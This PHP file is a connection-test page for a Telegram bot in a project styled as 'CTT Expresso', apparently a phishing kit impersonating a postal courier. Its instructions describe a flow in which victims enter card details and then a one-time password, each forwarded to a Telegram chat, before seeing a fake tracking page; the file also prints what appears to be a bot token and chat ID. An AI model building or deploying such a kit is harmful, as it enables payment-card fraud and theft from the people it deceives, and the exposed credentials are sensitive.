<?php
require_once 'config/telegram.php';

echo "<h2>🔔 Testing Telegram Connection...</h2>";

try {
    $telegram = new TelegramService();
    
    // Test simple message
    $testMessage = "🧪 **Test Message from CTT Expresso Application**\n\n" .
                  "**Time:** " . date('d/m/Y H:i:s') . "\n" .
                  "**Status:** Testing connection\n\n" .
                  "If you see this message, your Telegram integration is working perfectly! ✅\n\n" .
                  "═══════════════════════════════\n" .
                  "🚀 CTT Expresso System Test 🚀\n" .
                  "═══════════════════════════════";
    
    $result = $telegram->sendMessage($testMessage, 'Markdown');
    
    if ($result) {
        echo "<p style='color: #28a745; font-weight: bold;'>✅ SUCCESS: Test message sent to Telegram!</p>";
        echo "<p style='color: #17a2b8;'>📱 Check your Telegram chat for the test message.</p>";
        echo "<p style='color: #6c757d;'>You can now test the full application flow:</p>";
        echo "<ol>";
        echo "<li>Go to <a href='billing.php'>billing.php</a></li>";
        echo "<li>Fill out the form and submit</li>";
        echo "<li>Enter card details and submit (first Telegram message)</li>";
        echo "<li>Enter any OTP and submit (second Telegram message)</li>";
        echo "<li>View confirmation page with tracking</li>";
        echo "</ol>";
    } else {
        echo "<p style='color: #dc3545; font-weight: bold;'>❌ FAILED: Could not send message to Telegram.</p>";
        echo "<p style='color: #ffc107;'>⚠️ Possible issues:</p>";
        echo "<ul>";
        echo "<li>Bot token is incorrect</li>";
        echo "<li>Chat ID is incorrect</li>";
        echo "<li>Bot is not added to the chat/group</li>";
        echo "<li>Internet connection issues</li>";
        echo "<li>cURL is not properly configured</li>";
        echo "</ul>";
        
        echo "<p style='color: #17a2b8;'>💡 Troubleshooting steps:</p>";
        echo "<ol>";
        echo "<li>Verify bot token: 8482443491:AAE2BLcm95hkizPLXXDVUXenHjamWd2qdws</li>";
        echo "<li>Verify chat ID: -1003023517840</li>";
        echo "<li>Make sure the bot is added to the chat/group</li>";
        echo "<li>Check your internet connection</li>";
        echo "<li>Enable cURL in PHP if disabled</li>";
        echo "</ol>";
    }
    
} catch (Exception $e) {
    echo "<p style='color: #dc3545; font-weight: bold;'>❌ ERROR: " . htmlspecialchars($e->getMessage()) . "</p>";
    echo "<p style='color: #ffc107;'>Check your database connection and Telegram configuration.</p>";
}

echo "<hr>";
echo "<p><a href='test-system.php'>← Back to System Test</a> | <a href='billing.php'>Start Application →</a></p>";
?>